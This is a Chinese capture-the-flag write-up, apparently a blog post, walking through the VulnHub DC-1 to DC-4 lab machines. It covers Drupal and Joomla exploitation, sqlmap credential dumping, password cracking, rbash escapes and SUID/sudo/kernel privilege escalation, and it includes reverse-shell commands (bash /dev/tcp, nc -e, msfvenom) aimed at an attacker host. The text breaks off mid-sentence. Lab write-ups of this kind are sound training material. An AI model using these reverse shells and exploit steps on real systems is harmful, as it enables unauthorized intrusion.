        <content type="html"><![CDATA[<h1 id="DC靶场"><a href="#DC靶场" class="headerlink" title="DC靶场"></a>DC靶场</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><a href="https://download.vulnhub.com/dc/DC-1.zip">DC-1</a></p><p>vm打开解压的DC-1.ova</p><p>输入虚拟机名称和选择存储路径，点击导入，一般会弹出导入失败的对话框，不用理，直接点击重试。导入完成之后，先不要着急开机</p><p>然后配置一下网络</p><p><img src="https://bu.dusays.com/2024/10/11/6709357fce91a.png" alt="image-20240819205240345"></p><p>跟kali配成一样的</p><p>然后就打开kali和DC1</p><p>DC-1打开是这样的：</p><p><img src="https://bu.dusays.com/2024/10/11/6709357f230e0.png" alt="image-20240819235823400"></p><p>我们渗透的目的就是等进去</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466">nmap参数</a></p><p>先扫描一下 确定一下ip和port</p><p><code>nmap -sP 192.168.49.1/24</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093581afcdf.png" alt="image-20240821213646806"></p><p>发现有三台主机</p><p>进一步扫码呢</p><p><code>nmap -PS -PA 192.168.49.1/24</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935970885d.png" alt="image-20240821213731107"></p><p>判断目标主机是192.168.49.129</p><p>开放端口是22 80 111</p><p>22是ssh服务，80是http，111是一个rpcbind远程调用</p><p>访问一下这个ip呢</p><p><img src="https://bu.dusays.com/2024/10/11/6709357f77fa7.png" alt="image-20240821220542076"></p><p>是一个登录界面</p><p>搜索Drupal 发现是一个CMS</p><p><img src="https://bu.dusays.com/2024/10/11/670935872bff6.png" alt="image-20240821222918054"></p><p>Drupal 7 </p><p>直接上MSF</p><p><code>msfdb run</code></p><p><code>search Drupal 7</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709359a3a15b.png" alt="image-20240821223639283"></p><p>发现有漏洞框架</p><p>用0</p><p><img src="https://bu.dusays.com/2024/10/11/6709359e43821.png" alt="image-20240821224912610"></p><p>只用设置rhost</p><p><code>set rhost 192.168.49.129</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358026474.png" alt="image-20240821225144291"></p><p>但是没用 换一个框架呢</p><p><code>use1</code></p><p>同样的去设置rhost</p><p>咦都不行</p><p>扫描一下呢</p><p> <img src="https://bu.dusays.com/2024/10/11/6709357fbef92.png" alt="image-20240821234541728"></p><p>没有漏洞？</p><p>这个msf有点问题</p><p>换了一个kali打</p><p><img src="https://bu.dusays.com/2024/10/11/6709358a12489.png" alt="image-20240825185301558"></p><p>进去了</p><p>步骤还是像上面一样 就不细写了</p><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>ls一下</p><p><img src="https://bu.dusays.com/2024/10/11/670935a10d315.png" alt="image-20240825185903488"></p><p>发现flag1.txt</p><p><code>cat flag1.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358436d54.png" alt="image-20240825185946058"></p><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>在flag1中看到给了一个提示</p><blockquote><p>Every good CMS needs a config file - and so do you</p><p>每个好的CMS都需要一个配置文件——你也是</p></blockquote><p>所以我们找一下它的配置文件</p><p>网上一搜就有</p><blockquote><p>sites&#x2F;default&#x2F;settings.php</p></blockquote><p>直接cat一下</p><p><img src="https://bu.dusays.com/2024/10/11/6709359942b4b.png" alt="image-20240825190645184"></p><p>出</p><h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>flag2同样给了提示</p><blockquote><p>flag2</p><p>Brute force and dictionary attacks aren’t the</p><p>only ways to gain access (and you WILL need access).</p><p>What can you do with these credentials?</p><p>标志 2</p><p>暴力破解和字典攻击不是</p><p>只有获得访问权限的方法（您将需要访问权限）。</p><p>您可以使用这些凭证做什么？</p></blockquote><p>注意这个cms是有个登录端口的</p><p>这个提示应该就是想让我们爆破登录</p><p><img src="https://bu.dusays.com/2024/10/11/670935997c760.png" alt="image-20240825191053184"></p><p>在flag2后面还有一个数据库的信息</p><p>我们可以尝试登录一下数据库</p><p>先从mysql开始试下</p><p>这里我们需要shell一下</p><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p>注意shell的命令是无法修改的</p><p><code>mysql -u dbuser -p</code></p><p>进入mysql</p><p><img src="https://bu.dusays.com/2024/10/11/670935a00bac9.png" alt="image-20240825193123107"></p><p><code>show databases;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358c4b7b6.png" alt="image-20240825193550801"></p><p><code>use drupaldb;</code></p><p><code>show tables;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358a08a76.png" alt="image-20240825193841306"></p><p>发现user表</p><p>看下表里的信息</p><p><code>select * from users\G;</code></p><p>查看表的信息并纵向排列:</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240825194038024.png" alt="image-20240825194038024"></p><p>admin用户</p><p>在Mysql中用户的密码是md5加密的</p><p>可以直接解密的 在cmd5上 但是要付费 </p><p><img src="https://bu.dusays.com/2024/10/11/6709357f89966.png" alt="image-20240825194545800"></p><p>没办法 我们只要考虑修改一下密码了</p><p>我们找一下Mysql中的加密脚本呢</p><p><code>find . -name “*hash*”</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093582bce5d.png" alt="image-20240825201833910"></p><p>找到了</p><p>直接调用就行</p><p><code>./scripts/password-hash.sh 123456</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358b72d6a.png" alt="image-20240825202156575"></p><p><code>$S$Dt/Yo1WMT.zsriJEUyF9Qcvb3lgaMyzB1iMrSmeV2bEf1O7T1fOH</code></p><p>回到数据库中 改密码</p><p><code>update users set pass=&#39;$S$Dt/Yo1WMT.zsriJEUyF9Qcvb3lgaMyzB1iMrSmeV2bEf1O7T1fOH&#39; where name=&#39;admin&#39;;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358d938d7.png" alt="image-20240825203232415"></p><p>注意这里要进入drupaldb里</p><p><img src="https://bu.dusays.com/2024/10/11/67093583184e6.png" alt="image-20240825203505420"></p><p>成功登录</p><p><img src="https://bu.dusays.com/2024/10/11/67093582c350a.png" alt="image-20240825203542051"></p><p>找到flag3</p><p><img src="https://bu.dusays.com/2024/10/11/6709358239ea3.png" alt="image-20240825203629554"></p><h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><blockquote><p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p><p>特殊的 PERMS 将帮助找到密码 - 但您需要 -exec 该命令来了解如何获取阴影中的内容。</p></blockquote><p>我们到passwd里面找下</p><p><code>cat /etc/passwd</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093597b0131.png" alt="image-20240825204335560"></p><p>找到flag4</p><p><img src="https://bu.dusays.com/2024/10/11/67093582c07cd.png" alt="image-20240825204459540"></p><p>cd进去看下</p><p><img src="https://bu.dusays.com/2024/10/11/67093584b7a88.png" alt="image-20240825204752783"></p><p><img src="https://bu.dusays.com/2024/10/11/67093587f36c3.png" alt="image-20240825204910890"></p><p>好像是权限不够</p><h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>这里我们不能上传文件 </p><p>linux提权的话这里我们考虑用suid提权</p><p><img src="https://bu.dusays.com/2024/10/11/6709359c28ec0.png" alt="image-20240825213634778"></p><p>发现了find文件</p><p>find 提权</p><p><code> find /usr/bin/find -exec &quot;/bin/bash&quot; -p \;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935831382d.png" alt="image-20240825214701841"></p><p>最后找到root文件夹</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240825214807737.png" alt="image-20240825214807737"></p><p>这就是全部的flag了</p><h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><p>环境配置跟DC1一模一样</p><p>这里就不写了 把靶机下下来 改一下网络连接就行</p><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>先扫秒吧</p><p><code>arp-scan -l</code></p><p>扫描同网段的所有ip</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240825222157985.png" alt="image-20240825222157985"></p><p><img src="https://bu.dusays.com/2024/10/11/670935a02427d.png" alt="image-20240825224044836"></p><p>靶机地址是</p><p>192.168.31.75</p><p>具体扫下</p><p><code>nmap -sV -p- 192.168.31.75 </code></p><p><img src="https://bu.dusays.com/2024/10/11/67093592f0b96.png" alt="image-20240825224257511"></p><p>开了两个端口啊</p><p>访问一下呢</p><p><img src="https://bu.dusays.com/2024/10/11/6709358283ab4.png" alt="image-20240825224459463"></p><p>访问ip访问不到</p><p><code>nmap -A 192.168.31.75</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709359fdbd16.png" alt="image-20240825224714530"></p><p>可以看到80没有重定向到域名</p><p>我们需要设置hosts文件 添加：</p><blockquote><p>192.168.31.75  dc-2</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/6709358fc4c08.png" alt="image-20240825225241616"></p><p><code>vi /etc/hosts</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358bb197c.png" alt="image-20240825225429911"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240825230713892.png" alt="image-20240825230713892"></p><p>登录成功</p><p>发现flag1</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240825231238995.png" alt="image-20240825231238995"></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><blockquote><p>Flag 1:<br>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.<br>More passwords is always better, but sometimes you just can’t win them all.<br>Log in as one to see the next flag.<br>If you can’t find it, log in as another.</p><p>你通常的单词表可能不起作用，所以，也许你只需要保持清醒。<br>密码越多越好，但有时你就是无法赢得所有的密码。<br>以一个人的身份登录以查看下一个标志。<br>如果找不到，请以另一个用户登录。</p></blockquote><p>提示需要我们寻找密码和用户</p><p>whatweb一下</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240825230928238.png" alt="image-20240825230928238"></p><p>发现是wordpress</p><p>现在我们要找一下哪里有登录接口</p><p>dirsearch一下</p><p><code>dirsearch -u http://192.168.31.75</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826143504495.png" alt="image-20240826143504495"></p><p>看到有登录接口</p><p><img src="https://bu.dusays.com/2024/10/11/6709358760cbe.png" alt="image-20240826143855041"></p><p>百度上搜索wordpress发现有漏洞工具–wpscan</p><p>kali上自带wpscan</p><p><a href="https://www.freebuf.com/sectool/174663.html">使用</a></p><p><code>wpscan --url dc-2 -e u</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935d39e903.png" alt="image-20240826144326975"></p><p>看到有三个用户名</p><p>我们把他存在一个txt文件中</p><p><img src="https://bu.dusays.com/2024/10/11/670935943985e.png" alt="image-20240826145546218"></p><p>接下来就是爆破密码了</p><p>看到提示中有Cewl</p><p>使用这个</p><blockquote><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p></blockquote><p><code>cewl http://dc-2/ -w /home/kali/Desktop/password.txt</code></p><p>根据url生成字典</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826145306781.png" alt="image-20240826145306781"></p><p>现在 我们密码账号都有了</p><p>直接爆破</p><p>这里我们可以使用BP爆破</p><p>但是这里是wordpress 所以我们还可以用wpscan</p><p><code>wpscan --url http://dc-2 -U name.txt -P password.txt </code></p><p><img src="https://bu.dusays.com/2024/10/11/67093597a35e8.png" alt="image-20240826150104609"></p><p>扫出来两个</p><blockquote><p>Username: jerry, Password: adipiscing<br>Username: tom, Password: parturient</p></blockquote><p>登录</p><p>jerry登录成功</p><p>找到flag2</p><p><img src="https://bu.dusays.com/2024/10/11/6709358dd2de3.png" alt="image-20240826150719609"></p><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>If you can’t exploit WordPress and take a shortcut, there is another way.<br>Hope you found another entry point.</p><p>如果你不能利用WordPress并走捷径，还有另一种方法。<br>希望你找到了另一个入口。</p></blockquote><p>wordpress是http接口来的</p><p>但是我们扫描出的还有ssh接口–7744</p><p>刚刚我们是jerry登录的</p><p>现在我们试下tom</p><p>ssh登录</p><p><code>ssh tom@192.168.31.75 -p 7744</code></p><p>登录成功</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826151656580.png" alt="image-20240826151656580"></p><p>看下权限呢</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826151750030.png" alt="image-20240826151750030"></p><p>发现被rbash了</p><blockquote><p>rbash是<strong>Restricted bash</strong>缩写,即受限制的bash。 管理员可通过指定普通用户的bash为rbash,以此来限制相关操作。简单来说，区别于一般的shell，它会限制一些行为，让一些命令无法执行。</p></blockquote><p>先看下有哪些命令能用</p><p><code>compgen -c</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935995786d.png" alt="image-20240826152306063"></p><p><code>echo $PATH</code></p><p><code>echo /home/tom/usr/bin/*</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826152414405.png" alt="image-20240826152414405"></p><p>两个命令都可以啊</p><p>看到有vi和less</p><p>ls一下</p><p><img src="https://bu.dusays.com/2024/10/11/670935868e69b.png" alt="image-20240826152541618"></p><p>看下能不能直接看</p><p><code>less flag3.txt</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826152634899.png" alt="image-20240826152634899"></p><h3 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h3><p>虽然我们拿到了flag3</p><blockquote><p>flag3 </p><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br>可怜的老汤姆总是追着杰瑞跑。也许他应该为自己造成的压力而死。</p></blockquote><p>但是我们仍没有绕过rbash</p><p>flag3提示要用su</p><p>su是用来切换账户的</p><p>所以</p><p><code>su jerry</code></p><p>但是我们没有su的使用权限</p><p>所以我们还是要绕rbash</p><p>两个方法可以绕rbash</p><h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><blockquote><p>vi</p><p>vi写入</p><p>:set shell&#x3D;&#x2F;bin&#x2F;bash</p><p>:shell</p><p>回车退出vi</p><p>设置环境变量<br>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin&#x2F;</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/6709358650e2c.png" alt="image-20240826153620295"></p><p>如果没有设置环境变量还是不行</p><p><img src="https://bu.dusays.com/2024/10/11/67093589bf168.png" alt="image-20240826153745751"></p><p>因为系统找不到该用的shell</p><p><img src="https://bu.dusays.com/2024/10/11/670935959a541.png" alt="image-20240826153910453"></p><p>成功</p><h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><blockquote><p>执行X的时候相等于在执行shell</p><p>BASH_CMDS[x]&#x3D;&#x2F;bin&#x2F;bash</p><p>或者</p><p>BASH_CMDS[x]&#x3D;&#x2F;bin&#x2F;sh;x</p><p>设置环境变量</p><p>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/6709358ea8251.png" alt="image-20240826154740963"></p><p>绕过了就</p><p><code>su jerry</code></p><p><img src="https://bu.dusays.com/2024/10/11/67093597e8901.png" alt="image-20240826154913327"></p><p>登录成功</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826155140115.png" alt="image-20240826155140115"></p><p>找到flag4</p><h3 id="flag5-1"><a href="#flag5-1" class="headerlink" title="flag5"></a>flag5</h3><blockquote><p>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br>很高兴看到你已经走了这么远——但你还没有到家。<br>你仍然需要获得最终的旗帜(唯一真正重要的旗帜!!)<br>这里没有提示——你现在要靠自己了。:-）<br>走吧，离开这里!!!!</p></blockquote><p>应该是要提权了</p><p>linux的话还是suid提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>找下suid文件</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826155624806.png" alt="image-20240826155624806"></p><p>看来不是suid提权</p><p>回头看下提示发现提示git</p><p>可能是sudo提权</p><p>看下有什么root权限的命令吧</p><p><code>sudo -l</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709359962761.png" alt="image-20240826155937267"></p><p>果然是git</p><p><code>sudo git help config</code></p><p>然后直接输入：</p><p><code>!/bin/hash</code></p><p>回车</p><p><img src="https://bu.dusays.com/2024/10/11/6709358ad6fcf.png" alt="image-20240826160958018"></p><p>提权成功</p><p>找到最终flag</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826161140239.png" alt="image-20240826161140239"></p><h2 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h2><h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>先信息收集吧</p><p><code>arp-scan -l</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826172352845.png" alt="image-20240826172352845"></p><p>靶机地址是192.168.31.189</p><p>具体扫下</p><p><code>nmap -sV -p- 192.168.31.189 </code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826172602396.png" alt="image-20240826172602396"></p><p>发现只开放了80端口</p><p>访问一下</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826172740235.png" alt="image-20240826172740235"></p><p>只有1个flag啊 还要提权</p><p>whatweb一下</p><p><code>whatweb http://192.168.31.189</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826173951214.png" alt="image-20240826173951214"></p><p>Joomla</p><p>dirsearch扫一下</p><p><code>dirsearch -u http://192.168.31.189</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826174635096.png" alt="image-20240826174635096"></p><p>看到一个可疑路径</p><p>192.168.31.189&#x2F;administrator&#x2F;</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826174714028.png" alt="image-20240826174714028"></p><p>一个登录接口</p><p>我们可以用joomla扫描工具扫一下</p><p><code>apt install joomscan</code></p><p><code>joomscan -u 192.168.31.189</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826181117205.png" alt="image-20240826181117205"></p><p>msf是不能直接上线的</p><p>所以我们用searchsploit</p><blockquote><p>searchsploit是一个基于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。</p></blockquote><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826181517824.png" alt="image-20240826181517824"></p><p>发现一个sql注入漏洞</p><p>我们看下这个漏洞的exp</p><p><code>searchsploit -p 42033.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709359fcb72f.png" alt="image-20240826181804660"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826181908127.png" alt="image-20240826181908127"></p><p>不用访问url也行</p><p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826182035444.png" alt="image-20240826182035444"></p><p>多种exp可用</p><p>这里我们用sqlmap</p><p><code>sqlmap -u &quot;http://192.168.31.189/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826182623323.png" alt="image-20240826182623323"></p><p>查表</p><p><code>sqlmap -u &quot;http://192.168.31.189/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826185653985.png" alt="image-20240826185653985"></p><p>查列</p><p><code>sqlmap -u &quot;http://192.168.31.189/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935c1212fb.png" alt="image-20240826190041707"></p><p>查字段</p><p><code>sqlmap -u &quot;http://192.168.31.189/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password,username&quot; --dump  -p list[fullordering]</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826190157952.png" alt="image-20240826190157952"></p><blockquote><p>账户：admin</p><p>密码：<code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p></blockquote><p>kali自带解密工具john解密一下</p><p>放到一个txt文件中</p><p><code>john /home/kali/Desktop/ppassword.txt</code></p><p><code>john --show /home/kali/Desktop/ppassword.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935cba224e.png" alt="image-20240826190643719"></p><p>所以</p><blockquote><p>账户：admin</p><p>密码：snoopy</p></blockquote><p>登录</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826191200206.png" alt="image-20240826191200206"></p><p>找到一个可以上传文件的地方</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826192006937.png" alt="image-20240826192006937"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826192556996.png" alt="image-20240826192556996"></p><p>蚁剑连接</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826192859554.png" alt="image-20240826192859554"></p><p>看下权限</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826193016872.png" alt="image-20240826193016872"></p><p>普通权限</p><p>现在我们需要提权</p><p>这台linux我们有webshell权限</p><p>考虑内核提取</p><p>看下版本</p><p><code>uname -r</code></p><p><code>uname -a</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709358768a4e.png" alt="image-20240826193238343"></p><p>ubuntu的</p><p>传个信息收集的脚本上去扫下</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826194547849.png" alt="image-20240826194547849"></p><p>有脏牛啊</p><p>先试下脏牛</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826195359518.png" alt="image-20240826195359518"></p><p>没提上去啊</p><p>先给它搞到msf上</p><p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.63 LPORT=6363 &gt; shelll.php</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935a0ec35c.png" alt="image-20240826233931635"></p><p>上传到靶机</p><p>开监听</p><p>访问一下shelll.php</p><p>上线</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240826234752401.png" alt="image-20240826234752401"></p><p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;sh’)”</p><p>我这个shell有点问题</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827000742465.png" alt="image-20240827000742465"></p><p>换种方法呢</p><p><code>weevely http://192.168.31.189/templates/beez3/language/shell.php pass</code></p><blockquote><p>weevely是Linux中的菜刀</p><p>weevely generate test test.php  # 其中test为连接密码,test.php为路径 生成木马</p></blockquote><p><code>http://192.168.31.189/templates/beez3/pp.php</code></p><p>多种方式尝试最后只能反弹shll</p><p><code>&lt;?php system (&quot;bash -c &#39;bash -i  &gt;&amp; /dev/tcp/192.168.31.63/4444  0&gt;&amp;1&#39;&quot;); ?&gt;</code></p><p><code>nc lvp 4444</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935cd9985a.png" alt="image-20240827003057606"></p><p>用serachsploit找下</p><p><code>searchsploit ubuntu 16.04 linux</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827003544060.png" alt="image-20240827003544060"></p><p>用这个吧</p><p><code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827003631580.png" alt="image-20240827003631580"></p><p>下载一下exp</p><p><code>wget  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935c8162a1.png" alt="image-20240827003820102"></p><p>在39772.zip目录开下http</p><p><code>php -S 0.0.0.0:9696 </code></p><p><code>get http://192.168.31.63:9696/39772.zip</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935bf5c71a.png" alt="image-20240827004224216"></p><p><img src="https://bu.dusays.com/2024/10/11/670935c5abfef.png" alt="image-20240827004236992"></p><p>解压</p><p><img src="https://bu.dusays.com/2024/10/11/670935ce66b09.png" alt="image-20240827004343968"></p><p>按照说明</p><p><code>cd 39772 tar -xvf exploit.tar cd ebpf_mapfd_doubleput_exploit chmod 777 * ./compile.sh ./doubleput</code></p><p>拿下</p><p><img src="https://bu.dusays.com/2024/10/11/670935d2a2b2d.png" alt="image-20240827004845669"></p><p><img src="https://bu.dusays.com/2024/10/11/670935cc43bd2.png" alt="image-20240827004816423"></p><h2 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h2><p>扫描吧</p><p>多种方法都可以</p><p> <code>arp-scan -l</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827170704937.png" alt="image-20240827170704937"></p><p>靶机ip：192.168.31.179</p><p>具体扫下</p><p><code>nmap -sV -p- 192.168.31.179</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935ca7cd21.png" alt="image-20240827170937411"></p><p>可以看到开放了两个端口</p><p>访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/670935a217d7c.png" alt="image-20240827171055947"></p><p>一个登录接口</p><p>whatweb看下</p><p><code>whatweb 192.168.31.179</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935b529f35.png" alt="image-20240827171324364"></p><p>没有什么有用信息啊</p><p>那就只用从这个接口下手了</p><p>爆破一下 </p><p>猜测用户名admin</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827172653313.png" alt="image-20240827172653313"></p><p>成功爆破出密码是happy</p><p>登录</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827172846663.png" alt="image-20240827172846663"></p><p>可以列出文件</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827173038890.png" alt="image-20240827173038890"></p><p>ls -l</p><p>可能能执行命令</p><p>我们抓这个run试下</p><p><img src="https://bu.dusays.com/2024/10/11/670935a5adb1f.png" alt="image-20240827173506373"></p><p>果然是ls -l</p><p>看看能不能执行我们的命令</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827173657730.png" alt="image-20240827173657730"></p><p>执行成功了</p><p>执行个反弹shell到kali吧</p><p>这样看着不爽</p><p><code>nc 192.168.31.63 6363 -e/bin/bash</code></p><p>上线</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827174312426.png" alt="image-20240827174312426"></p><p>shell一下吧</p><p><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827174359240.png" alt="image-20240827174359240"></p><p>成功</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827174719765.png" alt="image-20240827174719765"></p><p>看到有三个用户</p><p>进去看下</p><p><img src="https://bu.dusays.com/2024/10/11/670935aacc1e2.png" alt="image-20240827175053007"></p><p>在jim里面发现了old-passwords.bak</p><p>我们把密码拿下来爆破一下</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827180207887.png" alt="image-20240827180207887"></p><p>用hydra爆破密码</p><p><code> hydra -L user.dic -P passwd.bak ssh://192.168.31.179 -vV -o hydra.ssh</code></p><blockquote><p><code>-L user.dic</code>: 指定用户名列表</p><p><code>-P passwd.bak</code>:指定密码列表</p><p><code>ssh://192.168.40.163</code>:指定爆破得IP地址</p><p><code>-vV</code>:设置 hydra 为详细模式，显示更多的输出信息</p><p><code>-o</code>:hydra.ssh:将结果输出到名为hydra.ssh的文件中</p></blockquote><p>最终结果</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240827181137114.png" alt="image-20240827181137114"></p><p>用户名:jim 密码:jibril04</p><p>这样的话我们就ssh登录一下</p><p><code>ssh jim@192.168.31.179 -p 22</code></p><p><img src="https://bu.dusays.com/2024/10/11/670935cf8799b.png" 